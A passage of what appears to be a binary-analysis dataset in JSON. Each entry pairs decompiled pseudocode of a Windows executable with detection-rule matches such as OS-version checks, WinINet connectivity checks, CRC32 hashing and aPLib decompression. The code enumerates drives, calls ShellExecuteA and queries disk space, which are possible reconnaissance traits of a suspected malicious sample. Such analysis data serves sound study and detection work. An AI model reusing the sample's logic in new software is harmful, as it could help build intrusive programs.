uVar4);\n                uVar2 = fcn.00407c1c(&var_74h, puVar3);\n                puVar3 = fcn.00407c84(uVar2, uVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x4045c0, puVar3, 0, 0);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                uVar5 = 0x4045c8;\n                puVar3 = &var_3ch;\n                uVar4 = 0x404590;\n                uVar2 = fcn.00408978(0x404598);\n                fcn.00407c84(uVar2, uVar4);\n                uVar2 = fcn.00407c1c(&var_74h, puVar3);\n                puVar3 = fcn.00407c84(uVar2, uVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x4045c0, puVar3, 0, 0);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040d730(0x404578);\n                fcn.00407dae(0x404578);\n                fcn.0040723c();\n                fcn.0040702c(0x4045ec);\n                fcn.0040723c();\n                fcn.0040571f(1);\n            }\n            if (var_94h == 4) {\n                uVar5 = 0x40457c;\n                puVar3 = &var_3ch;\n                uVar4 = 0x404590;\n                uVar2 = fcn.00408978(0x404598);\n                fcn.00407c84(uVar2, uVar4);\n                uVar2 = fcn.00407c1c(&var_74h, puVar3);\n                puVar3 = fcn.00407c84(uVar2, uVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x4045c0, puVar3, 0, 0);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                uVar5 = 0x4045c8;\n                puVar3 = &var_3ch;\n                uVar4 = 0x404590;\n                uVar2 = fcn.00408978(0x404598);\n                fcn.00407c84(uVar2, uVar4);\n                uVar2 = fcn.00407c1c(&var_74h, puVar3);\n                puVar3 = fcn.00407c84(uVar2, uVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x4045c0, puVar3, 0, 0);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040d730(0x404578);\n                fcn.00407dae(0x404578);\n                fcn.0040723c();\n                fcn.0040702c(0x4045f4);\n                fcn.0040723c();\n                fcn.0040571f(1);\n            }\n            puVar3 = var_3ch;\n            if (var_28h < 0x10) {\n                puVar3 = &var_3ch;\n            }\n            (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceExA)\n                      (puVar3, &lpFreeBytesAvailableToCaller, &lpTotalNumberOfBytes, 0);\n            var_94h = lpTotalNumberOfBytes >> 0x1e | var_a4h << 2;\n            fcn.004087b2();\n            var_94h = lpFreeBytesAvailableToCaller >> 0x1e | var_9ch << 2;\n            fcn.004087b2();\n            var_94h = lpTotalNumberOfBytes - lpFreeBytesAvailableToCaller >> 0x1e |\n                      ((var_a4h - var_9ch) - (lpTotalNumberOfBytes < lpFreeBytesAvailableToCaller)) * 4;\n            fcn.004087b2();\n            fcn.0040571f(1);\n        }\n        var_98h = var_98h + 1;\n    } while (var_98h < 0x1a);\n    fcn.0040b864(in_stack_ffffff48);\n    return;\n}\n",
        "token_count": 2341
    },
    "00408bf7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00408bf7(void)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t lplpBuffer;\n    uint puLen;\n    uint lpdwHandle;\n    \n    lpdwHandle = (*_sym.imp.VERSION.dll_GetFileVersionInfoSizeA)(0x404674, &lpdwHandle);\n    uVar2 = fcn.0040b859(lpdwHandle);\n    (*_sym.imp.VERSION.dll_GetFileVersionInfoA)(0x404674, 0, lpdwHandle, uVar2);\n    puLen = 0;\n    (*_sym.imp.VERSION.dll_VerQueryValueA)(uVar2, 0x404684, &lplpBuffer, &puLen);\n    iVar1 = *(lplpBuffer + 8);\n    if (*(lplpBuffer + 10) == 6) {\n        if (iVar1 == 1) {\n            uVar3 = 0x404688;\n            goto code_r0x00408c87;\n        }\n        if (iVar1 == 2) {\n            uVar3 = 0x404694;\n            goto code_r0x00408c87;\n        }\n        if (iVar1 == 3) {\n            uVar3 = 0x4046a0;\n            goto code_r0x00408c87;\n        }\n    }\n    else if ((*(lplpBuffer + 10) == 10) && (uVar3 = 0x4046ac,  iVar1 == 0)) goto code_r0x00408c87;\n    uVar3 = 0x4046b8;\ncode_r0x00408c87:\n    fcn.0040d730(uVar3);\n    fcn.00407523();\n    fcn.0040d85a(uVar2);\n    return;\n}\n",
        "token_count": 408
    },
    "0040a1e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a1e6(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 1;\n    cVar1 = fcn.0040793c(0x40501c);\n    if (cVar1 == '\\0') {\n        uVar5 = in_ECX[4];\n        if (uVar5 < in_EAX) {\n            fcn.0040b7eb(0x40453c);\n            uVar5 = extraout_ECX;\n        }\n        uVar2 = uVar5 - in_EAX;\n        if (uVar2 == 0) {\n            var_4h = uVar2;\n        }\n        if (-arg_8h - 1 <= uVar5 - var_4h) {\n            uVar2 = fcn.0040b79e(0x404554);\n        }\n        if (arg_8h < var_4h) {\n            puVar3 = in_ECX;\n            puVar4 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar3 = *in_ECX;\n                puVar4 = *in_ECX;\n            }\n            fcn.0040be70(puVar3 + arg_8h + in_EAX, puVar4 + var_4h + in_EAX, uVar2 - var_4h);\n        }\n        if ((arg_8h != 0) || (var_4h != 0)) {\n            iVar6 = (arg_8h - var_4h) + in_ECX[4];\n            cVar1 = fcn.004075c0(0);\n            if (cVar1 != '\\0') {\n                if (var_4h < arg_8h) {\n                    puVar3 = in_ECX;\n                    puVar4 = in_ECX;\n                    if (0xf < in_ECX[5]) {\n                        puVar3 = *in_ECX;\n                        puVar4 = *in_ECX;\n                    }\n                    fcn.0040be70(puVar3 + arg_8h + in_EAX, puVar4 + var_4h + in_EAX, uVar2 - var_4h);\n                }\n                puVar4 = in_ECX;\n                if (0xf < in_ECX[5]) {\n                    puVar4 = *in_ECX;\n                }\n                fcn.0040b880(puVar4 + in_EAX, 0x40501c, arg_8h);\n                in_ECX[4] = iVar6;\n                if (0xf < in_ECX[5]) {\n                    in_ECX = *in_ECX;\n                }\n                *(in_ECX + iVar6) = 0;\n            }\n        }\n    }\n    else {\n        puVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar4 = *in_ECX;\n        }\n        fcn.0040a325(in_ECX, 0x40501c - puVar4, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 759
    },
    "00405765": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405765(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x402120;\n    fcn.0040be0a();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040bd1b();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0040b838": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b838(uint32_t arg_8h)\n\n{\n    fcn.0040be0a();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040bd1b();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0040d8b6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d8b6(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_4h;\n    \n    do {\n        iVar2 = fcn.0040d936(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0040e897(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x413aac & 1) == 0) {\n        *0x413aac = *0x413aac | 1;\n        var_4h = 0x402128;\n        fcn.0040bd26(&var_4h);\n        *0x413aa0 = 0x402120;\n        fcn.0040bd04(0x413473);\n    }\n    fcn.0040be3c(0x413aa0);\n    var_10h = 0x402120;\n    fcn.0040dddd(&var_10h, 0x413730);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 264
    },
    "0040be15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be15(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4020f8;\n    fcn.0040bd90();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040bd1b();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040d875": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d875(uint32_t arg_8h)\n\n{\n    fcn.0040d865();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040bd1b();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "004122bd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004122bd(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x405428;\n    fcn.0040be0a();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040bd1b();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00407aea": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407aea(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    if ((arg_8h != 0) && (iVar1 = fcn.0040d8b6(arg_8h),  iVar1 == 0)) {\n        arg_8h = 0;\n        fcn.0040bdae(&arg_8h);\n        var_ch = 0x402120;\n        fcn.0040dddd(&var_ch, 0x413730);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0040806c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040806c(uint *arg_8h)\n\n{\n    int32_t arg_10h;\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    uint32_t uVar5;\n    \n    uVar5 = 0xffffffff;\n    if (arg_8h[4] != 0xffffffff) {\n        uVar5 = arg_8h[4];\n    }\n    iVar2 = unaff_ESI[4];\n    if (-iVar2 - 1U <= uVar5) {\n        iVar2 = fcn.0040b79e(0x404554);\n    }\n    if (uVar5 != 0) {\n        cVar1 = fcn.00407713(0);\n        if (cVar1 != '\\0') {\n            puVar3 = unaff_ESI;\n            puVar4 = unaff_ESI;\n            if (7 < unaff_ESI[5]) {\n                puVar3 = *unaff_ESI;\n                puVar4 = *unaff_ESI;\n            }\n            arg_10h = uVar5 * 2;\n            fcn.0040be70(puVar3 + arg_10h, puVar4, unaff_ESI[4] * 2);\n            if (unaff_ESI == arg_8h) {\n                puVar3 = unaff_ESI;\n                puVar4 = unaff_ESI;\n                if (7 < unaff_ESI[5]) {\n                    puVar3 = *unaff_ESI;\n                    puVar4 = *unaff_ESI;\n                }\n                fcn.0040be70(puVar3, puVar4, arg_10h);\n            }\n            else {\n                if (7 < arg_8h[5]) {\n                    arg_8h = *arg_8h;\n                }\n                puVar4 = unaff_ESI;\n                if (7 < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                }\n                fcn.0040b880(puVar4, arg_8h, arg_10h);\n            }\n            unaff_ESI[4] = iVar2 + uVar5;\n            if (7 < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + (iVar2 + uVar5) * 2) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 556
    },
    "004087fe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004087fe(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *unaff_ESI;\n    \n    if (in_EAX == -1) {\n        fcn.0040b79e(0x404554);\n    }\n    cVar1 = fcn.004075c0(0);\n    if (cVar1 != '\\0') {\n        fcn.0040758c(in_EAX);\n        unaff_ESI[4] = in_EAX;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + in_EAX) = 0;\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "004096ed": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409de3)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004096ed(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint in_stack_fffffc30;\n    uint32_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint noname_1;\n    uint arg_ch;\n    uint noname_1_00;\n    uint uVar10;\n    uint arg_ch_00;\n    uint noname_1_01;\n    uint uVar11;\n    uint arg_ch_01;\n    uint uVar12;\n    uint uVar13;\n    uint in_stack_fffffce0;\n    uint in_stack_fffffce4;\n    uint in_stack_fffffce8;\n    uint in_stack_fffffcec;\n    uint in_stack_fffffcf0;\n    uint var_2f4h;\n    uint var_2f0h;\n    int32_t var_2ech;\n    uint32_t var_2e8h;\n    uint32_t var_2e4h;\n    uchar var_2ddh;\n    uint var_2dch;\n    uint var_2c0h;\n    uint var_2a4h;\n    uint var_288h;\n    uint var_26ch;\n    uint var_250h;\n    uint var_234h;\n    uint var_218h;\n    uint var_1fch;\n    uint var_1e0h;\n    uint var_1c4h;\n    uint var_1a8h;\n    uint var_19ch;\n    uint var_18ch;\n    uint var_170h;\n    uint var_154h;\n    uint var_138h;\n    uint var_11ch;\n    uint var_100h;\n    uint var_e4h;\n    uint var_c8h;\n    uint var_ach;\n    uint var_90h;\n    uint var_74h;\n    uint var_58h;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_20h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    uVar13 = 0x404ee0;\n    fcn.0040702c(0x404ee0);\n    uVar12 = 0x40971d;\n    var_2e8h = fcn.0040b24c(uVar13, in_stack_fffffce0, in_stack_fffffce4, in_stack_fffffce8, in_stack_fffffcec, \n                            in_stack_fffffcf0);\n    uVar11 = 0x404ef4;\n    fcn.0040702c(0x404ef4);\n    noname_1_01 = 0x409745;\n    fcn.0040b24c(uVar11, uVar12, uVar13, in_stack_fffffce0, in_stack_fffffce4, in_stack_fffffce8);\n    uVar10 = 0x404f08;\n    fcn.0040702c(0x404f08);\n    noname_1_00 = 0x40976d;\n    fcn.0040b24c(uVar10, noname_1_01, uVar11, uVar12, uVar13, in_stack_fffffce0);\n    uVar13 = 0x404f18;\n    fcn.0040702c(0x404f18);\n    noname_1 = 0x409795;\n    var_2e4h = fcn.0040b24c(uVar13, noname_1_00, uVar10, noname_1_01, uVar11, uVar12);\n    uVar11 = 0x404f30;\n    fcn.0040702c(0x404f30);\n    uVar8 = 0x4097bd;\n    fcn.0040b24c(uVar11, noname_1, uVar13, noname_1_00, uVar10, noname_1_01);\n    arg_ch_01 = 0x401f7c;\n    uVar10 = 0x404f50;\n    fcn.0040702c(0x404f50);\n    uVar7 = 0x4097e5;\n    fcn.0040b24c(uVar10, uVar8, uVar11, noname_1, uVar13, noname_1_00);\n    arg_ch_00 = 0x402040;\n    uVar6 = 0x404f60;\n    fcn.0040702c(0x404f60);\n    uVar12 = 0x409809;\n    fcn.0040b24c(uVar6, uVar7, uVar10, uVar8, uVar11, noname_1);\n    arg_ch = 0x401ef0;\n    uVar13 = 0x404f74;\n    fcn.0040702c(0x404f74);\n    uVar11 = 0x40982d;\n    fcn.0040b24c(uVar13, uVar12, uVar6, uVar7, uVar10, uVar8);\n    uVar9 = 0x402024;\n    uVar10 = 0x404f8c;\n    fcn.0040702c(0x404f8c);\n    fcn.0040b24c(uVar10, uVar11, uVar13, uVar12, uVar6, uVar7);\n    fcn.00407c1c(&fcn.004096ed::var_138h, uVar8);\n    fcn.00407c40();\n    fcn.00407c1c(&fcn.004096ed::var_100h, uVar9);\n    fcn.00407c40();\n    fcn.00407c1c(&fcn.004096ed::var_c8h, noname_1);\n    fcn.00407c40();\n    fcn.00407c1c(&fcn.004096ed::var_2c0h, arg_ch);\n    fcn.00407c40();\n    fcn.00407c1c(&fcn.004096ed::var_288h, noname_1_00);\n    fcn.00407c40();\n    fcn.00407c1c(&fcn.004096ed::var_234h, arg_ch_00);\n    fcn.00407c40();\n    fcn.00407c1c(&fcn.004096ed::var_2dch, noname_1_01);\n    fcn.00407c40();\n    fcn.00407c1c(&fcn.004096ed::var_3ch, arg_ch_01);\n    fcn.00407c40();\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    var_2ddh = 10;\n    puVar3 = var_20h;\n    if (var_ch < 0x10) {\n        puVar3 = &fcn.004096ed::var_20h;\n    }\n    puVar2 = var_20h;\n    if (var_ch < 0x10) {\n        puVar2 = &fcn.004096ed::var_20h;\n    }\n    fcn.00407bd2(&fcn.004096ed::var_2e8h, puVar2, puVar3 + var_10h);\n    puVar3 = var_20h;\n    if (var_ch < 0x10) {\n        puVar3 = &fcn.004096ed::var_20h;\n    }\n    fcn.00407136(var_2e8h, puVar3 + var_10h);\n    var_2ddh = 0xd;\n    puVar3 = var_20h;\n    if (var_ch < 0x10) {\n        puVar3 = &fcn.004096ed::var_20h;\n    }\n    puVar2 = var_20h;\n    if (var_ch < 0x10) {\n        puVar2 = &fcn.004096ed::var_20h;\n    }\n    fcn.00407bd2(&fcn.004096ed::var_2e8h, puVar2, puVar3 + var_10h);\n    puVar3 = var_20h;\n    if (var_ch < 0x10) {\n        puVar3 = &fcn.004096ed::var_20h;\n    }\n    uVar5 = var_2e8h;\n    fcn.00407136(var_2e8h, puVar3 + var_10h);\n    var_2e4h = 0;\n    if ((*0x4147a8 - *0x4147a4) / 0x1c != 0) {\n        var_2ech = 0;\n        do {\n            uVar5 = var_2e4h;\n            uVar10 = *(*0x4147b4 + var_2e4h * 4);\n            puVar3 = &fcn.004096ed::var_30h;\n            fcn.0040da84(uVar10, puVar3, 0x10, 10);\n            uVar12 = 10;\n            uVar13 = 0x10;\n            puVar2 = &fcn.004096ed::var_19ch;\n            fcn.0040da84(*(*0x4147d4 + uVar5 * 4), puVar2, 0x10, 10);\n            iVar1 = var_2ech + *0x4147a4;\n            iVar4 = var_2ech + *0x4147c4;\n            uVar8 = 0x404fa0;\n            fcn.0040702c(0x404fa0);\n            uVar11 = 0x409bb3;\n            fcn.0040b24c(uVar8, puVar2, uVar13, uVar12, uVar10, puVar3);\n            uVar7 = 0x404fac;\n            fcn.0040702c(0x404fac);\n            uVar10 = 0x409bdd;\n            fcn.0040b24c(uVar7, uVar11, uVar8, puVar2, uVar13, uVar12);\n            uVar6 = 0x404fc8;\n            fcn.0040702c(0x404fc8);\n            uVar12 = 0x409c00;\n            var_2e8h = fcn.0040b24c(uVar6, uVar10, uVar7, uVar11, uVar8, puVar2);\n            uVar9 = 0x404684;\n            uVar13 = 0x404fe4;\n            fcn.0040702c(0x404fe4);\n            uVar11 = 0x409c26;\n            fcn.0040b24c(uVar13, in_stack_fffffc30, uVar12, uVar6, uVar10, uVar7);\n            uVar10 = 0x405000;\n            fcn.0040702c(0x405000);\n            fcn.0040b24c(uVar10, uVar11, uVar13, in_stack_fffffc30, uVar12, uVar6);\n            fcn.00407c1c(&fcn.004096ed::var_90h, uVar7);\n            fcn.00407c40();\n            uVar10 = fcn.00407c1c(&fcn.004096ed::var_e4h, iVar4);\n            fcn.00407c84(uVar10, uVar8);\n            uVar10 = fcn.00407c40();\n            fcn.00407c84(uVar10, iVar1);\n            uVar10 = fcn.00407c40();\n            fcn.00407c84(uVar10, uVar9);\n            uVar10 = fcn.00407c40();\n            fcn.00407d1a(uVar10, 0);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            in_stack_fffffc30 = 1;\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            fcn.0040571f(1);\n            uVar5 = 1;\n            fcn.0040571f(1);\n            var_2e4h = var_2e4h + 1;\n            var_2ech = var_2ech + 0x1c;\n        } while (var_2e4h < (*0x4147a8 - *0x4147a4) / 0x1c);\n    }\n    iVar1 = fcn.0040d730(0x405018);\n    if ((iVar1 != 0) && (var_10h != 0)) {\n        puVar3 = var_20h;\n        if (var_ch < 0x10) {\n            puVar3 = &fcn.004096ed::var_20h;\n        }\n        puVar3 = puVar3 + (var_10h - 1);\n        while (iVar4 = fcn.0040dab0(0x405018, *puVar3, iVar1),  iVar4 == 0) {\n            puVar2 = var_20h;\n            if (var_ch < 0x10) {\n                puVar2 = &fcn.004096ed::var_20h;\n            }\n            if (puVar3 == puVar2) break;\n            puVar3 = puVar3 + -1;\n        }\n    }\n    uVar10 = fcn.0040d730(0x40501c);\n    fcn.0040a1e6(uVar10);\n    var_44h = 0xf;\n    var_48h = 0;\n    var_58h._0_1_ = 0;\n    var_2e4h = 0;\n    if (var_10h != 0) {\n        do {\n            puVar3 = var_20h;\n            if (var_ch < 0x10) {\n                puVar3 = &fcn.004096ed::var_20h;\n            }\n            var_2e8h = var_2e8h & 0xffffff00 | *(puVar3 + var_2e4h);\n            var_28h = 0xf;\n            var_2ch = 0;\n            var_3ch._0_1_ = 0;\n            fcn.004089c6();\n            fcn.00407d1a(&fcn.004096ed::var_58h, 0);\n            fcn.00407070(var_2e8h);\n            fcn.00407291();\n            fcn.0040571f(1);\n            if ((1000 < var_48h) || (var_2e4h + 1 == var_10h)) {\n                fcn.0040723c();\n                fcn.0040d730(0x404631);\n                fcn.00407523();\n            }\n            var_2e4h = var_2e4h + 1;\n        } while (var_2e4h < var_10h);\n    }\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040b864(uVar5);\n    return;\n}\n",
        "token_count": 3867
    },
    "0040b6cf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040b6cf(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint32_t arg_18h, uint32_t arg_1ch, \n            uint noname_6, uint *arg_24h, uint noname_8, uint noname_9, uint noname_10, uint32_t arg_34h, \n            uint32_t arg_38h)\n\n{\n    uint32_t arg_10h;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint *var_4h;\n    \n    arg_10h = arg_34h;\n    puVar3 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar3 = &arg_24h;\n    }\n    if (arg_34h != 0) {\n        if ((arg_18h != 0) && (arg_34h <= arg_18h)) {\n            iVar5 = (arg_18h - arg_34h) + 1;\n            var_4h = arg_8h;\n            if (arg_1ch < 0x10) {\n                var_4h = &arg_8h;\n            }\n            while (iVar2 = fcn.0040dab0(var_4h, *puVar3, iVar5),  iVar2 != 0) {\n                iVar1 = fcn.0040c1d1(iVar2, puVar3, arg_10h);\n                if (iVar1 == 0) {\n                    puVar3 = arg_8h;\n                    if (arg_1ch < 0x10) {\n                        puVar3 = &arg_8h;\n                    }\n                    iVar2 = iVar2 - puVar3;\n                    goto code_r0x0040b743;\n                }\n                iVar5 = var_4h + ((iVar5 + -1) - iVar2);\n                var_4h = iVar2 + 1;\n            }\n        }\n        iVar2 = -1;\ncode_r0x0040b743:\n        if (iVar2 == -1) {\n            uVar4 = 0;\n            goto code_r0x0040b74b;\n        }\n    }\n    uVar4 = 1;\ncode_r0x0040b74b:\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    return uVar4;\n}\n",
        "token_count": 571
    },
    "004074cc": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004074cc(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    uVar2 = (param_1[1] - iVar1) / 0x1c;\n    if (0x9249248 < uVar2) {\n        fcn.0040b79e(0x404564);\n        param_1 = extraout_ECX;\n    }\n    uVar3 = (param_1[2] - iVar1) / 0x1c;\n    uVar2 = uVar2 + 1;\n    if (uVar3 < uVar2) {\n        if (0x9249249 - (uVar3 >> 1) < uVar3) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = uVar3 + (uVar3 >> 1);\n        }\n        if (uVar3 < uVar2) {\n            uVar3 = uVar2;\n        }\n        fcn.0040777f(uVar3);\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "00407857": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407857(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004120fc(0xc);\n    piVar1 = *(unaff_EBP + 8);\n    uVar7 = *(unaff_EBP + 0xc) | 0xf;\n    if (uVar7 == 0xffffffff) {\n        uVar7 = *(unaff_EBP + 0xc);\n    }\n    else {\n        uVar2 = piVar1[5];\n        *(unaff_EBP + -0x14) = uVar2;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar3 = *(unaff_EBP + -0x14);\n        if ((uVar7 / 3 < uVar3) && (uVar7 = 0xfffffffe,  uVar2 <= -uVar3 - 2)) {\n            uVar7 = uVar3 + uVar2;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00407aea(uVar7 + 1);\n    *(unaff_EBP + -0x18) = uVar5;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        piVar6 = piVar1;\n        if (0xf < piVar1[5]) {\n            piVar6 = *piVar1;\n        }\n        fcn.0040b880(*(unaff_EBP + -0x18), piVar6, *(unaff_EBP + 0x10));\n    }\n    fcn.0040571f(1);\n    piVar6 = *(unaff_EBP + -0x18);\n    *piVar1 = piVar6;\n    piVar1[5] = uVar7;\n    iVar4 = *(unaff_EBP + 0x10);\n    piVar1[4] = iVar4;\n    if (uVar7 < 0x10) {\n        piVar6 = piVar1;\n    }\n    *(piVar6 + iVar4) = 0;\n    fcn.00412132();\n    return;\n}\n",
        "token_count": 604
    },
    "00407977": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
